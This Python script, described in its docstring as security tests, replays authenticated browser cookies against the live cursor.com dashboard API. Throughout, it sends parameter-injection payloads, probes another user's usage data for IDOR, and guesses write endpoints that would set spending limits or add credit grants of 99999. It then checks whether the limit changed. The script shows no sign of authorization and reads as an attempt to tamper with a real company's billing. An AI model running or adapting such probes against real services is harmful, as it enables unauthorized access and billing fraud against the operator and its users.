#!/usr/bin/env python3
"""
Replay script for Cursor dashboard API security tests.
Tests parameter injection, IDOR, and write-endpoint discovery per crake.txt.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

try:
    import requests
except ImportError:
    print("Install requests: pip install requests")
    sys.exit(1)

BASE = "https://cursor.com"
REFERER = "https://cursor.com/dashboard/settings?from=2026-02-16&to=2026-03-17"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"


def load_cookies(cookies_path: Path) -> dict[str, str]:
    """Load cookies from JSON (Chrome extension format) to requests-compatible dict."""
    with open(cookies_path) as f:
        data = json.load(f)
    return {c["name"]: c["value"] for c in data if "cursor" in c.get("domain", "").lower()}


def session_with_cookies(cookies_path: Path) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept": "*/*",
        "Accept-Language": "en-US,en-GB;q=0.9,en;q=0.8",
        "Origin": BASE,
        "Referer": REFERER,
        "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    })
    cookies = load_cookies(cookies_path)
    for k, v in cookies.items():
        s.cookies.set(k, v, domain=".cursor.com")
    return s


def run(s: requests.Session, method: str, url: str, json_body: dict | None = None) -> tuple[int, str]:
    """Run request and return (status_code, response_text)."""
    try:
        if method == "GET":
            r = s.get(url, timeout=15)
        else:
            r = s.post(url, json=json_body or {}, timeout=15)
        return r.status_code, r.text[:500]
    except Exception as e:
        return -1, str(e)


def main() -> None:
    root = Path(__file__).resolve().parent
    cookies_path = root / "cookies"
    if not cookies_path.exists():
        print("cookies file not found")
        sys.exit(1)

    s = session_with_cookies(cookies_path)
    user_id = "user_01KHTHPRT0QDGRGJ4P89FG72KK"
    start_ts = 1771880456000

    tests = [
        # --- Baseline (legitimate) ---
        ("baseline", "POST", f"{BASE}/api/dashboard/get-hard-limit", {}),
        ("baseline", "POST", f"{BASE}/api/dashboard/get-credit-grants-balance", {}),
        ("baseline", "GET", f"{BASE}/api/usage?user={user_id}", None),

        # --- Parameter injection: get-hard-limit ---
        ("inject", "POST", f"{BASE}/api/dashboard/get-hard-limit", {"hardLimit": 999999}),
        ("inject", "POST", f"{BASE}/api/dashboard/get-hard-limit", {"hardLimitCents": 9999999}),
        ("inject", "POST", f"{BASE}/api/dashboard/get-hard-limit", {"hardLimit": -1}),
        ("inject", "POST", f"{BASE}/api/dashboard/get-hard-limit", {"teamId": 12345}),

        # --- Parameter injection: get-credit-grants-balance ---
        ("inject", "POST", f"{BASE}/api/dashboard/get-credit-grants-balance", {"balance": 99999}),
        ("inject", "POST", f"{BASE}/api/dashboard/get-credit-grants-balance", {"amount": 99999}),

        # --- Parameter injection: get-current-period-usage ---
        ("inject", "POST", f"{BASE}/api/dashboard/get-current-period-usage", {"used": 0}),

        # --- Parameter injection: get-aggregated-usage-events ---
        ("inject", "POST", f"{BASE}/api/dashboard/get-aggregated-usage-events", {"teamId": 99999, "startDate": start_ts}),

        # --- IDOR: usage endpoint ---
        ("idor", "GET", f"{BASE}/api/usage?user=user_01FAKE0000000000000000000", None),

        # --- Write endpoint discovery ---
        ("write", "POST", f"{BASE}/api/dashboard/set-hard-limit", {"hardLimitCents": 9999999}),
        ("write", "POST", f"{BASE}/api/dashboard/add-credit-grants", {"amount": 99999}),
        ("write", "POST", f"{BASE}/api/dashboard/set-credit-grants-balance", {"balance": 99999}),
    ]

    print("=" * 70)
    print("Cursor API replay tests (from crake.txt)")
    print("=" * 70)

    baselines: dict[str, str] = {}
    for cat, method, url, body in tests:
        status, text = run(s, method, url, body)
        short_url = url.replace(BASE, "")
        label = f"{cat}: {short_url[:60]}"
        if body:
            label += f" body={json.dumps(body)[:40]}..."

        # Store baseline for comparison
        if cat == "baseline":
            key = url.split("?")[0]
            baselines[key] = text

        # Check for interesting responses
        flag = ""
        if status == 200 and cat == "inject":
            base_key = url.split("?")[0]
            base_resp = baselines.get(base_key)
            if base_resp is not None and text != base_resp:
                flag = " [DIFF from baseline - possible injection?]"
        if status == 200 and cat == "write":
            flag = " [200 on write endpoint - investigate!]"
        if status == 200 and cat == "idor":
            flag = " [200 on different user - possible IDOR?]"

        print(f"\n{label}")
        print(f"  status={status} | response: {text[:120]!r}{flag}")

    # Verification: if set-hard-limit returned 200, re-check get-hard-limit
    print("\n--- Verification: set-hard-limit follow-up ---")
    _, after_set = run(s, "POST", f"{BASE}/api/dashboard/get-hard-limit", {})
    base_hard = baselines.get(f"{BASE}/api/dashboard/get-hard-limit", "")
    if after_set != base_hard:
        print(f"  get-hard-limit CHANGED after set-hard-limit: {base_hard!r} -> {after_set!r}")
    else:
        print(f"  get-hard-limit unchanged: {after_set!r}")

    print("\n" + "=" * 70)
    print("Done. Compare inject/write/idor responses to baselines.")
    print("=" * 70)


if __name__ == "__main__":
    main()
